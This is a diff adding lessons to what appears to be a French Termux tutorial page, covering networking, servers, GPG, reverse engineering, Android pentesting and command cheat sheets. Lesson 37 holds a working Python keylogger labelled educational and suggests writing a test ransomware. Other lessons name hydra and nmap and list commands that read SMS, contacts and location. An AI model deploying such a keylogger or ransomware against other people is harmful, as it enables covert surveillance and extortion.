+      <p>Lire une capture :</p>
+      <div class="code-block">tcpdump -r capture.pcap</div>
+      <p>Filtrer :</p>
+      <div class="code-block">tcpdump -i any port 80
+tcpdump -i any host 192.168.1.1</div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">30</span>
+      <h3>Frameworks Web : Flask et Express</h3>
+    </div>
+    <div class="lecon-body">
+      <p><strong>Flask (Python) :</strong></p>
+      <div class="code-block">pip install flask
+nano app.py</div>
+      <p>Code :</p>
+      <div class="code-block">from flask import Flask
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+    return "Bonjour Sky-Terminal !"
+
+app.run(host='0.0.0.0', port=5000)</div>
+      <p>Lance : <code>python app.py</code></p>
+
+      <p><strong>Express (Node.js) :</strong></p>
+      <div class="code-block">npm init -y
+npm install express
+nano server.js</div>
+      <p>Code :</p>
+      <div class="code-block">const express = require('express');
+const app = express();
+app.get('/', (req, res) => res.send('Bonjour !'));
+app.listen(3000);</div>
+      <p>Lance : <code>node server.js</code></p>
+    </div>
+  </div>
+</section>
+
+<!-- ========== NIVEAU 4 : EXPERT (10 leçons) ========== -->
+<section class="container niveau" id="niveau4">
+  <h2 class="section-title">⚫ Niveau 4 — Expert</h2>
+  <p class="niveau-desc">Automatisation avancée, API, sécurité offensive et défensive.</p>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">31</span>
+      <h3>Automatisation avancée (cron, at)</h3>
+    </div>
+    <div class="lecon-body">
+      <p>Exécuter des tâches automatiquement :</p>
+      <div class="code-block">pkg install cronie
+crond</div>
+      <p>Éditer les tâches :</p>
+      <div class="code-block">crontab -e</div>
+      <p>Exemples :</p>
+      <div class="code-block"># Tous les jours à 8h
+0 8 * * * /data/data/com.termux/files/home/backup.sh
+
+# Toutes les heures
+0 * * * * echo "hello" &gt;&gt; log.txt</div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">32</span>
+      <h3>Termux API complet</h3>
+    </div>
+    <div class="lecon-body">
+      <div class="code-block">pkg install termux-api</div>
+      <p>Puis installe l'app Termux:API depuis F-Droid.</p>
+      <p>Commandes utiles :</p>
+      <div class="cmd-list">
+        <div class="cmd-item"><code>termux-battery-status</code> <span>→ État batterie (JSON)</span></div>
+        <div class="cmd-item"><code>termux-camera-photo img.jpg</code> <span>→ Prendre une photo</span></div>
+        <div class="cmd-item"><code>termux-clipboard-get</code> <span>→ Lire le presse-papier</span></div>
+        <div class="cmd-item"><code>termux-clipboard-set "texte"</code> <span>→ Écrire dans presse-papier</span></div>
+        <div class="cmd-item"><code>termux-toast "msg"</code> <span>→ Toast Android</span></div>
+        <div class="cmd-item"><code>termux-vibrate -d 500</code> <span>→ Vibrer 500ms</span></div>
+        <div class="cmd-item"><code>termux-notification --title "Titre"</code> <span>→ Notification</span></div>
+        <div class="cmd-item"><code>termux-tts-speak "Bonjour"</code> <span>→ Synthèse vocale</span></div>
+        <div class="cmd-item"><code>termux-wifi-scaninfo</code> <span>→ Réseaux WiFi</span></div>
+        <div class="cmd-item"><code>termux-location</code> <span>→ Position GPS</span></div>
+        <div class="cmd-item"><code>termux-sms-list</code> <span>→ Liste SMS</span></div>
+        <div class="cmd-item"><code>termux-contact-list</code> <span>→ Contacts</span></div>
+        <div class="cmd-item"><code>termux-torch on</code> <span>→ Allumer la lampe</span></div>
+        <div class="cmd-item"><code>termux-volume</code> <span>→ Volume</span></div>
+        <div class="cmd-item"><code>termux-brightness 200</code> <span>→ Luminosité</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">33</span>
+      <h3>Serveurs SSH, HTTP, FTP</h3>
+    </div>
+    <div class="lecon-body">
+      <p><strong>SSH server :</strong></p>
+      <div class="code-block">sshd
+# Connecte-toi : ssh -p 8022 user@ton_ip</div>
+      <p><strong>Serveur HTTP Python :</strong></p>
+      <div class="code-block">python -m http.server 8000</div>
+      <p><strong>Serveur FTP :</strong></p>
+      <div class="code-block">pkg install python
+pip install pyftpdlib
+python -m pyftpdlib -p 2121</div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">34</span>
+      <h3>Docker via Proot</h3>
+    </div>
+    <div class="lecon-body">
+      <p>Docker n'est pas officiellement supporté, mais tu peux l'utiliser via Ubuntu :</p>
+      <div class="code-block">proot-distro login ubuntu
+apt update
+apt install docker.io
+dockerd &
+docker run hello-world</div>
+      <p class="tip">⚠️ Peut ne pas fonctionner sur tous les appareils à cause des limitations du kernel.</p>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">35</span>
+      <h3>Cryptographie avec GPG</h3>
+    </div>
+    <div class="lecon-body">
+      <div class="code-block">pkg install gnupg</div>
+      <p>Générer une clé :</p>
+      <div class="code-block">gpg --gen-key</div>
+      <p>Chiffrer un fichier :</p>
+      <div class="code-block">gpg -c secret.txt
+# Crée secret.txt.gpg</div>
+      <p>Déchiffrer :</p>
+      <div class="code-block">gpg -d secret.txt.gpg</div>
+      <p>Chiffrer avec clé publique :</p>
+      <div class="code-block">gpg --encrypt --recipient email fichier.txt</div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">36</span>
+      <h3>Reverse Engineering (basique)</h3>
+    </div>
+    <div class="lecon-body">
+      <p>Outils :</p>
+      <div class="code-block">pkg install binutils file strings</div>
+      <p>Analyser un binaire :</p>
+      <div class="code-block">file binaire
+strings binaire | grep -i password
+objdump -d binaire | head</div>
+      <p>Désassembler :</p>
+      <div class="code-block">pkg install radare2
+r2 binaire
+# Dans radare2 :
+# aaa  (analyser)
+# afl  (lister les fonctions)
+# pdf  (désassembler)</div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">37</span>
+      <h3>Scripts malveillants — Éthique</h3>
+    </div>
+    <div class="lecon-body">
+      <p><strong>⚠️ À utiliser UNIQUEMENT pour apprendre et sur tes propres appareils !</strong></p>
+      <p>Keylogger éducatif (Python) :</p>
+      <div class="code-block">pip install pynput
+nano keylog.py</div>
+      <p>Exemple simple :</p>
+      <div class="code-block">from pynput import keyboard
+def on_press(key):
+    with open("log.txt", "a") as f:
+        f.write(str(key) + "\n")
+with keyboard.Listener(on_press=on_press) as l:
+    l.join()</div>
+      <p>Ransomware éducatif : utilise <code>cryptography</code> pour chiffrer tes propres fichiers de test.</p>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">38</span>
+      <h3>Pentest Android (sur tes appareils)</h3>
+    </div>
+    <div class="lecon-body">
+      <p>Outils :</p>
+      <div class="code-block">pkg install nmap hydra curl
+pip install drozer  # via Ubuntu</div>
+      <p>Analyser une APK :</p>
+      <div class="code-block">pkg install apktool
+apktool d app.apk
+# Examine les fichiers smali</div>
+      <p>Extraire des infos :</p>
+      <div class="code-block">unzip app.apk -d extrait/
+cat extrait/AndroidManifest.xml</div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">39</span>
+      <h3>Personnalisation totale du terminal</h3>
+    </div>
+    <div class="lecon-body">
+      <p><strong>Oh My Zsh :</strong></p>
+      <div class="code-block">pkg install zsh
+sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"
+chsh -s zsh</div>
+      <p><strong>Powerlevel10k :</strong></p>
+      <div class="code-block">git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ~/.oh-my-zsh/custom/themes/powerlevel10k
+echo 'ZSH_THEME="powerlevel10k/powerlevel10k"' &gt;&gt; ~/.zshrc</div>
+      <p><strong>Effets :</strong></p>
+      <div class="code-block">pkg install cmatrix cowsay fortune
+cmatrix
+cowsay "Bonjour Sky"
+fortune | cowsay</div>
+    </div>
+  </div>
+
+  <div class="lecon">
+    <div class="lecon-header">
+      <span class="lecon-num">40</span>
+      <h3>Développement APK (basique)</h3>
+    </div>
+    <div class="lecon-body">
+      <p>Tu peux compiler des APK avec AIDE ou via Ubuntu :</p>
+      <div class="code-block">proot-distro login ubuntu
+apt install openjdk-17-jdk android-sdk
+# Configure le SDK
+# Compile avec gradle ou ant</div>
+      <p>Pour modifier une APK existante :</p>
+      <div class="code-block">pkg install apktool
+apktool d app.apk
+# Modifie les fichiers
+apktool b app -o app_modifie.apk</div>
+      <p>Signer l'APK :</p>
+      <div class="code-block">pkg install apksigner
+apksigner sign --ks ma_cle.jks app_modifie.apk</div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== COMMANDES COMPLÈTES (12 catégories) ========== -->
+<section class="container" id="commandes">
+  <h2 class="section-title">💻 Toutes les Commandes Termux</h2>
+  <p class="niveau-desc">Plus de 200 commandes classées par catégorie</p>
+
+  <div class="tabs">
+    <button class="tab-btn active" data-tab="basiques">Basiques</button>
+    <button class="tab-btn" data-tab="paquets">Paquets</button>
+    <button class="tab-btn" data-tab="fichiers">Fichiers</button>
+    <button class="tab-btn" data-tab="texte">Texte</button>
+    <button class="tab-btn" data-tab="reseau">Réseau</button>
+    <button class="tab-btn" data-tab="systeme">Système</button>
+    <button class="tab-btn" data-tab="processus">Processus</button>
+    <button class="tab-btn" data-tab="permissions">Permissions</button>
+    <button class="tab-btn" data-tab="archives">Archives</button>
+    <button class="tab-btn" data-tab="termuxapi">Termux API</button>
+    <button class="tab-btn" data-tab="dev">Développement</button>
+    <button class="tab-btn" data-tab="pro">Pro</button>
+  </div>
+
+  <div class="tab-content active" id="basiques">
+    <div class="terminal-box">
+      <div class="terminal-bar">
+        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+        <span class="term-title">sky@terminal:~/basiques$</span>
+      </div>
+      <div class="terminal-content">
+        <p><span class="cmd">$ pwd</span> <span class="com"># Affiche le dossier actuel</span></p>
+        <p><span class="cmd">$ ls</span> <span class="com"># Liste les fichiers</span></p>
+        <p><span class="cmd">$ ls -la</span> <span class="com"># Liste détaillée avec cachés</span></p>
+        <p><span class="cmd">$ cd dossier</span> <span class="com"># Entrer dans un dossier</span></p>
+        <p><span class="cmd">$ cd ..</span> <span class="com"># Reculer</span></p>
+        <p><span class="cmd">$ cd ~</span> <span class="com"># Retour à la maison</span></p>
+        <p><span class="cmd">$ cd -</span> <span class="com"># Dossier précédent</span></p>
+        <p><span class="cmd">$ clear</span> <span class="com"># Effacer l'écran</span></p>
+        <p><span class="cmd">$ exit</span> <span class="com"># Quitter Termux</span></p>
+        <p><span class="cmd">$ history</span> <span class="com"># Historique des commandes</span></p>
+        <p><span class="cmd">$ !!</span> <span class="com"># Rejouer la dernière commande</span></p>
+        <p><span class="cmd">$ man commande</span> <span class="com"># Manuel d'une commande</span></p>
+        <p><span class="cmd">$ commande --help</span> <span class="com"># Aide rapide</span></p>
+        <p><span class="cmd">$ which commande</span> <span class="com"># Chemin d'une commande</span></p>
+        <p><span class="cmd">$ whoami</span> <span class="com"># Qui suis-je ?</span></p>
+        <p><span class="cmd">$ date</span> <span class="com"># Date et heure</span></p>
+        <p><span class="cmd">$ cal</span> <span class="com"># Calendrier</span></p>
+        <p><span class="cmd">$ echo "texte"</span> <span class="com"># Afficher du texte</span></p>
+        <p><span class="cmd">$ alias ll='ls -la'</span> <span class="com"># Créer un raccourci</span></p>
+      </div>
+    </div>
+  </div>
+
+  <div class="tab-content" id="paquets">
+    <div class="terminal-box">
+      <div class="terminal-bar">
+        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+        <span class="term-title">sky@terminal:~/pkg$</span>
+      </div>
+      <div class="terminal-content">
+        <p><span class="cmd">$ pkg update</span> <span class="com"># Mettre à jour la liste</span></p>
+        <p><span class="cmd">$ pkg upgrade</span> <span class="com"># Mettre à jour les paquets</span></p>
+        <p><span class="cmd">$ pkg install [nom]</span> <span class="com"># Installer</span></p>
+        <p><span class="cmd">$ pkg uninstall [nom]</span> <span class="com"># Désinstaller</span></p>
+        <p><span class="cmd">$ pkg reinstall [nom]</span> <span class="com"># Réinstaller</span></p>
+        <p><span class="cmd">$ pkg search [mot]</span> <span class="com"># Chercher un paquet</span></p>
+        <p><span class="cmd">$ pkg list-installed</span> <span class="com"># Paquets installés</span></p>
+        <p><span class="cmd">$ pkg list-all</span> <span class="com"># Tous les paquets dispo</span></p>
+        <p><span class="cmd">$ pkg show [nom]</span> <span class="com"># Infos sur un paquet</span></p>
+        <p><span class="cmd">$ pkg files [nom]</span> <span class="com"># Fichiers installés</span></p>
+        <p><span class="cmd">$ pkg clean</span> <span class="com"># Nettoyer le cache</span></p>
+        <p><span class="cmd">$ pkg autoclean</span> <span class="com"># Nettoyage auto</span></p>
+        <p><span class="cmd">$ apt update</span> <span class="com"># Alternative Debian</span></p>
+        <p><span class="cmd">$ apt install [nom]</span> <span class="com"># Alternative</span></p>
+        <p><span class="cmd">$ dpkg -l</span> <span class="com"># Lister les paquets</span></p>
+      </div>
+    </div>
+  </div>
+
+  <div class="tab-content" id="fichiers">
+    <div class="terminal-box">
+      <div class="terminal-bar">
+        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+        <span class="term-title">sky@terminal:~/files$</span>
+      </div>
+      <div class="terminal-content">
+        <p><span class="cmd">$ touch fichier.txt</span> <span class="com"># Créer un fichier</span></p>
+        <p><span class="cmd">$ mkdir dossier</span> <span class="com"># Créer un dossier</span></p>
+        <p><span class="cmd">$ mkdir -p a/b/c</span> <span class="com"># Créer plusieurs niveaux</span></p>
+        <p><span class="cmd">$ cp source dest</span> <span class="com"># Copier</span></p>
+        <p><span class="cmd">$ cp -r dossier1 dossier2</span> <span class="com"># Copier un dossier</span></p>
+        <p><span class="cmd">$ mv source dest</span> <span class="com"># Déplacer/Renommer</span></p>
+        <p><span class="cmd">$ rm fichier</span> <span class="com"># Supprimer</span></p>
+        <p><span class="cmd">$ rm -r dossier</span> <span class="com"># Supprimer un dossier</span></p>
+        <p><span class="cmd">$ rm -rf dossier</span> <span class="com"># Forcer la suppression</span></p>
+        <p><span class="cmd">$ find . -name "*.jpg"</span> <span class="com"># Chercher par motif</span></p>
+        <p><span class="cmd">$ find . -type f -size +10M</span> <span class="com"># Fichiers &gt; 10Mo</span></p>
+        <p><span class="cmd">$ locate fichier</span> <span class="com"># Localiser (nécessite updatedb)</span></p>
+        <p><span class="cmd">$ ln -s source lien</span> <span class="com"># Lien symbolique</span></p>
+        <p><span class="cmd">$ file fichier</span> <span class="com"># Type de fichier</span></p>
+        <p><span class="cmd">$ stat fichier</span> <span class="com"># Statistiques</span></p>
+        <p><span class="cmd">$ du -sh dossier</span> <span class="com"># Taille d'un dossier</span></p>
+        <p><span class="cmd">$ tree</span> <span class="com"># Arborescence (pkg install tree)</span></p>
+      </div>
+    </div>
+  </div>
+
+  <div class="tab-content" id="texte">
+    <div class="terminal-box">
+      <div class="terminal-bar">
+        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+        <span class="term-title">sky@terminal:~/text$</span>
+      </div>
+      <div class="terminal-content">
+        <p><span class="cmd">$ cat fichier</span> <span class="com"># Afficher tout</span></p>
+        <p><span class="cmd">$ head fichier</span> <span class="com"># 10 premières lignes</span></p>
+        <p><span class="cmd">$ head -n 20 fichier</span> <span class="com"># 20 lignes</span></p>
+        <p><span class="cmd">$ tail fichier</span> <span class="com"># 10 dernières lignes</span></p>
+        <p><span class="cmd">$ tail -f log.txt</span> <span class="com"># Suivre en direct</span></p>
+        <p><span class="cmd">$ less fichier</span> <span class="com"># Lire page par page</span></p>
+        <p><span class="cmd">$ more fichier</span> <span class="com"># Idem simplifié</span></p>
+        <p><span class="cmd">$ nano fichier</span> <span class="com"># Éditer simple</span></p>
+        <p><span class="cmd">$ vim fichier</span> <span class="com"># Éditer avancé</span></p>
+        <p><span class="cmd">$ grep "mot" fichier</span> <span class="com"># Chercher un mot</span></p>
+        <p><span class="cmd">$ grep -i "mot" fichier</span> <span class="com"># Insensible à la casse</span></p>
+        <p><span class="cmd">$ grep -r "mot" dossier</span> <span class="com"># Récursif</span></p>
+        <p><span class="cmd">$ sed 's/ancien/nouveau/g' f</span> <span class="com"># Remplacer</span></p>
+        <p><span class="cmd">$ awk '{print $1}' fichier</span> <span class="com"># 1ère colonne</span></p>
+        <p><span class="cmd">$ wc -l fichier</span> <span class="com"># Compter les lignes</span></p>
+        <p><span class="cmd">$ wc -w fichier</span> <span class="com"># Compter les mots</span></p>
+        <p><span class="cmd">$ sort fichier</span> <span class="com"># Trier</span></p>
+        <p><span class="cmd">$ uniq fichier</span> <span class="com"># Supprimer doublons</span></p>
+        <p><span class="cmd">$ diff fichier1 fichier2</span> <span class="com"># Différences</span></p>
+        <p><span class="cmd">$ echo "texte" &gt; f.txt</span> <span class="com"># Écraser</span></p>
+        <p><span class="cmd">$ echo "texte" &gt;&gt; f.txt</span> <span class="com"># Ajouter</span></p>
+      </div>
+    </div>
+  </div>
+
+  <div class="tab-content" id="reseau">
+    <div class="terminal-box">
+      <div class="terminal-bar">
+        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+        <span class="term-title">sky@terminal:~/network$</span>
+      </div>
+      <div class="terminal-content">
+        <p><span class="cmd">$ ping google.com</span> <span class="com"># Tester la connexion</span></p>
+        <p><span class="cmd">$ ping -c 4 google.com</span> <span class="com"># 4 pings seulement</span></p>
+        <p><span class="cmd">$ ifconfig</span> <span class="com"># Infos réseau</span></p>
+        <p><span class="cmd">$ ip a</span> <span class="com"># Alternative moderne</span></p>
+        <p><span class="cmd">$ netstat -tuln</span> <span class="com"># Ports ouverts</span></p>
+        <p><span class="cmd">$ curl [URL]</span> <span class="com"># Requête HTTP</span></p>
+        <p><span class="cmd">$ curl -O [URL]</span> <span class="com"># Télécharger un fichier</span></p>
+        <p><span class="cmd">$ curl -X POST -d "a=1" [URL]</span> <span class="com"># POST</span></p>
+        <p><span class="cmd">$ wget [URL]</span> <span class="com"># Télécharger</span></p>
+        <p><span class="cmd">$ wget -r [URL]</span> <span class="com"># Télécharger récursif</span></p>
+        <p><span class="cmd">$ ssh user@ip</span> <span class="com"># Connexion SSH</span></p>
+        <p><span class="cmd">$ ssh -p 8022 user@ip</span> <span class="com"># Port custom</span></p>
+        <p><span class="cmd">$ scp fichier user@ip:/chemin</span> <span class="com"># Copier via SSH</span></p>
+        <p><span class="cmd">$ sshd</span> <span class="com"># Démarrer serveur SSH</span></p>
+        <p><span class="cmd">$ nmap -sV cible</span> <span class="com"># Scanner les ports</span></p>
+        <p><span class="cmd">$ traceroute google.com</span> <span class="com"># Tracer la route</span></p>
+        <p><span class="cmd">$ dig google.com</span> <span class="com"># DNS lookup</span></p>
+        <p><span class="cmd">$ host google.com</span> <span class="com"># DNS simple</span></p>
+        <p><span class="cmd">$ whois google.com</span> <span class="com"># Infos domaine</span></p>
+      </div>
+    </div>
+  </div>
+
+  <div class="tab-content" id="systeme">
+    <div class="terminal-box">
+      <div class="terminal-bar">
+        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+        <span class="term-title">sky@terminal:~/system$</span>
+      </div>
+      <div class="terminal-content">
+        <p><span class="cmd">$ uname -a</span> <span class="com"># Infos système</span></p>
+        <p><span class="cmd">$ uname -r</span> <span class="com"># Version kernel</span></p>
+        <p><span class="cmd">$ uptime</span> <span class="com"># Temps allumé</span></p>
+        <p><span class="cmd">$ df -h</span> <span class="com"># Espace disque</span></p>
+        <p><span class="cmd">$ du -sh *</span> <span class="com"># Taille des dossiers</span></p>
+        <p><span class="cmd">$ free -h</span> <span class="com"># Mémoire utilisée</span></p>
+        <p><span class="cmd">$ top</span> <span class="com"># Processus en cours</span></p>
+        <p><span class="cmd">$ htop</span> <span class="com"># Meilleur moniteur</span></p>
+        <p><span class="cmd">$ ps aux</span> <span class="com"># Tous les processus</span></p>
+        <p><span class="cmd">$ ps -ef</span> <span class="com"># Alternative</span></p>
+        <p><span class="cmd">$ env</span> <span class="com"># Variables d'environnement</span></p>
+        <p><span class="cmd">$ printenv</span> <span class="com"># Idem</span></p>
+        <p><span class="cmd">$ export VAR=valeur</span> <span class="com"># Définir variable</span></p>
+        <p><span class="cmd">$ dmesg</span> <span class="com"># Messages kernel</span></p>
+        <p><span class="cmd">$ reboot</span> <span class="com"># Redémarrer (root)</span></p>
+      </div>
+    </div>
+  </div>
+
+  <div class="tab-content" id="processus">
+    <div class="terminal-box">
+      <div class="terminal-bar">
+        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+        <span class="term-title">sky@terminal:~/proc$</span>
+      </div>
+      <div class="terminal-content">
+        <p><span class="cmd">$ ps aux</span> <span class="com"># Tous les processus</span></p>
+        <p><span class="cmd">$ top</span> <span class="com"># Moniteur en direct</span></p>
+        <p><span class="cmd">$ kill [PID]</span> <span class="com"># Tuer un processus</span></p>
+        <p><span class="cmd">$ kill -9 [PID]</span> <span class="com"># Forcer</span></p>
+        <p><span class="cmd">$ pkill nom</span> <span class="com"># Tuer par nom</span></p>
+        <p><span class="cmd">$ killall nom</span> <span class="com"># Tuer tous</span></p>
+        <p><span class="cmd">$ bg</span> <span class="com"># Mettre en arrière-plan</span></p>
+        <p><span class="cmd">$ fg</span> <span class="com"># Ramener au premier plan</span></p>
+        <p><span class="cmd">$ jobs</span> <span class="com"># Liste des jobs</span></p>
+        <p><span class="cmd">$ cmd &amp;</span> <span class="com"># Lancer en arrière-plan</span></p>
+        <p><span class="cmd">$ nohup cmd &amp;</span> <span class="com"># Ne pas arrêter à la fermeture</span></p>
+        <p><span class="cmd">$ Ctrl+C</span> <span class="com"># Arrêter</span></p>
+        <p><span class="cmd">$ Ctrl+Z</span> <span class="com"># Pause</span></p>
+      </div>
+    </div>
+  </div>
+
+  <div class="tab-content" id="permissions">
+    <div class="terminal-box">
+      <div class="terminal-bar">
+        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+        <span class="term-title">sky@terminal:~/perm$</span>
+      </div>
+      <div class="terminal-content">
+        <p><span class="cmd">$ ls -l</span> <span class="com"># Voir permissions</span></p>
+        <p><span class="cmd">$ chmod +x script.sh</span> <span class="com"># Rendre exécutable</span></p>
+        <p><span class="cmd">$ chmod -x script.sh</span> <span class="com"># Retirer exécution</span></p>
+        <p><span class="cmd">$ chmod 755 fichier</span> <span class="com"># rwxr-xr-x</span></p>
+        <p><span class="cmd">$ chmod 644 fichier</span> <span class="com"># rw-r--r--</span></p>
+        <p><span class="cmd">$ chmod 777 fichier</span> <span class="com"># Tout ouvert (DANGER)</span></p>
+        <p><span class="cmd">$ chmod 600 clé.pem</span> <span class="com"># Clé privée</span></p>
+        <p><span class="cmd">$ chown user fichier</span> <span class="com"># Changer propriétaire</span></p>
+        <p><span class="cmd">$ chgrp group fichier</span> <span class="com"># Changer groupe</span></p>
+        <p><span class="cmd">$ umask</span> <span class="com"># Permissions par défaut</span></p>
+      </div>
+    </div>
+  </div>
+
+  <div class="tab-content" id="archives">
+    <div class="terminal-box">
+      <div class="terminal-bar">
+        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+        <span class="term-title">sky@terminal:~/archive$</span>
+      </div>
+      <div class="terminal-content">
+        <p><span class="cmd">$ tar -czvf a.tar.gz dossier</span> <span class="com"># Créer archive gz</span></p>
+        <p><span class="cmd">$ tar -xzvf a.tar.gz</span> <span class="com"># Extraire gz</span></p>
+        <p><span class="cmd">$ tar -cjvf a.tar.bz2 dossier</span> <span class="com"># Créer bz2</span></p>
+        <p><span class="cmd">$ tar -xjvf a.tar.bz2</span> <span class="com"># Extraire bz2</span></p>
+        <p><span class="cmd">$ zip -r a.zip dossier</span> <span class="com"># Créer ZIP</span></p>
+        <p><span class="cmd">$ unzip a.zip</span> <span class="com"># Extraire ZIP</span></p>
+        <p><span class="cmd">$ unzip -l a.zip</span> <span class="com"># Lister contenu</span></p>
+        <p><span class="cmd">$ gzip fichier</span> <span class="com"># Compresser</span></p>
+        <p><span class="cmd">$ gunzip fichier.gz</span> <span class="com"># Décompresser</span></p>
+        <p><span class="cmd">$ 7z x archive.7z</span> <span class="com"># Extraire 7z</span></p>
+      </div>
+    </div>
+  </div>
+
+  <div class="tab-content" id="termuxapi">
+    <div class="terminal-box">
+      <div class="terminal-bar">
+        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+        <span class="term-title">sky@terminal:~/api$</span>
+      </div>
+      <div class="terminal-content">
+        <p><span class="cmd">$ termux-setup-storage</span> <span class="com"># Accès stockage</span></p>
+        <p><span class="cmd">$ termux-battery-status</span> <span class="com"># État batterie</span></p>
+        <p><span class="cmd">$ termux-camera-info</span> <span class="com"># Infos caméras</span></p>
+        <p><span class="cmd">$ termux-camera-photo img.jpg</span> <span class="com"># Prendre photo</span></p>
+        <p><span class="cmd">$ termux-clipboard-get</span> <span class="com"># Lire presse-papier</span></p>
+        <p><span class="cmd">$ termux-clipboard-set "txt"</span> <span class="com"># Écrire</span></p>
+        <p><span class="cmd">$ termux-contact-list</span> <span class="com"># Liste contacts</span></p>
+        <p><span class="cmd">$ termux-dialog</span> <span class="com"># Boîte de dialogue</span></p>
+        <p><span class="cmd">$ termux-download URL</span> <span class="com"># Télécharger via Android</span></p>
+        <p><span class="cmd">$ termux-fingerprint</span> <span class="com"># Empreinte digitale</span></p>
+        <p><span class="cmd">$ termux-infrared-frequencies</span> <span class="com"># Infrarouge</span></p>
+        <p><span class="cmd">$ termux-location</span> <span class="com"># Position GPS</span></p>
+        <p><span class="cmd">$ termux-media-player play</span> <span class="com"># Lecteur média</span></p>
+        <p><span class="cmd">$ termux-microphone-record</span> <span class="com"># Enregistrer audio</span></p>
+        <p><span class="cmd">$ termux-notification</span> <span class="com"># Notification</span></p>
+        <p><span class="cmd">$ termux-sensor</span> <span class="com"># Capteurs</span></p>
+        <p><span class="cmd">$ termux-share fichier</span> <span class="com"># Partager</span></p>
+        <p><span class="cmd">$ termux-sms-list</span> <span class="com"># Liste SMS</span></p>
+        <p><span class="cmd">$ termux-sms-send</span> <span class="com"># Envoyer SMS</span></p>
+        <p><span class="cmd">$ termux-storage-get</span> <span class="com"># Choisir fichier</span></p>
+        <p><span class="cmd">$ termux-telephony-call</span> <span class="com"># Appeler</span></p>
+        <p><span class="cmd">$ termux-toast "msg"</span> <span class="com"># Toast</span></p>
+        <p><span class="cmd">$ termux-torch on</span> <span class="com"># Lampe</span></p>
+        <p><span class="cmd">$ termux-tts-speak "txt"</span> <span class="com"># Parler</span></p>
+        <p><span class="cmd">$ termux-usb</span> <span class="com"># USB</span></p>
+        <p><span class="cmd">$ termux-vibrate</span> <span class="com"># Vibrer</span></p>
+        <p><span class="cmd">$ termux-volume</span> <span class="com"># Volume</span></p>
+        <p><span class="cmd">$ termux-wallpaper</span> <span class="com"># Fond d'écran</span></p>
+        <p><span class="cmd">$ termux-wifi-connectioninfo</span> <span class="com"># Info WiFi</span></p>
+        <p><span class="cmd">$ termux-wifi-scaninfo</span> <span class="com"># Scanner WiFi</span></p>
+      </div>
+    </div>
+  </div>
+
+  <div class="tab-content" id="dev">
+    <div class="terminal-box">
+      <div class="terminal-bar">
+        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+        <span class="term-title">sky@terminal:~/dev$</span>
+      </div>
+      <div class="terminal-content">
+        <p><span class="cmd">$ python</span> <span class="com"># Interpréteur Python</span></p>
+        <p><span class="cmd">$ python script.py</span> <span class="com"># Lancer un script</span></p>
+        <p><span class="cmd">$ pip install [pkg]</span> <span class="com"># Installer package</span></p>
+        <p><span class="cmd">$ python -m venv env</span> <span class="com"># Créer venv</span></p>
+        <p><span class="cmd">$ node script.js</span> <span class="com"># Lancer Node.js</span></p>
+        <p><span class="cmd">$ npm install [pkg]</span> <span class="com"># Installer npm</span></p>
+        <p><span class="cmd">$ npm init -y</span> <span class="com"># Init projet</span></p>
+        <p><span class="cmd">$ clang hello.c -o hello</span> <span class="com"># Compiler C</span></p>
+        <p><span class="cmd">$ clang++ h.cpp -o h</span> <span class="com"># Compiler C++</span></p>
+        <p><span class="cmd">$ gcc hello.c -o hello</span> <span class="com"># GCC</span></p>
+        <p><span class="cmd">$ make</span> <span class="com"># Compiler Makefile</span></p>
+        <p><span class="cmd">$ java Hello.java</span> <span class="com"># Java</span></p>
+        <p><span class="cmd">$ go run main.go</span> <span class="com"># Go</span></p>
+        <p><span class="cmd">$ ruby script.rb</span> <span class="com"># Ruby</span></p>
+        <p><span class="cmd">$ php -S localhost:8080</span> <span class="com"># Serveur PHP</span></p>
+        <p><span class="cmd">$ git clone URL</span> <span class="com"># Cloner repo</span></p>
+        <p><span class="cmd">$ git status</span> <span class="com"># Statut</span></p>
+        <p><span class="cmd">$ git add .</span> <span class="com"># Ajouter tout</span></p>
+        <p><span class="cmd">$ git commit -m "msg"</span> <span class="com"># Commit</span></p>
+        <p><span class="cmd">$ git push</span> <span class="com"># Push</span></p>
+        <p><span class="cmd">$ git pull</span> <span class="com"># Pull</span></p>
+      </div>
+    </div>
+  </div>
+
+  <div class="tab-content" id="pro">
+    <div class="terminal-box">
+      <div class="terminal-bar">
+        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+        <span class="term-title">sky@terminal:~/pro$</span>
+      </div>
+      <div class="terminal-content">
+        <p><span class="cmd">$ proot-distro list</span> <span class="com"># Lister distros</span></p>
+        <p><span class="cmd">$ proot-distro install ubuntu</span> <span class="com"># Installer Ubuntu</span></p>
+        <p><span class="cmd">$ proot-distro login ubuntu</span> <span class="com"># Entrer dans Ubuntu</span></p>
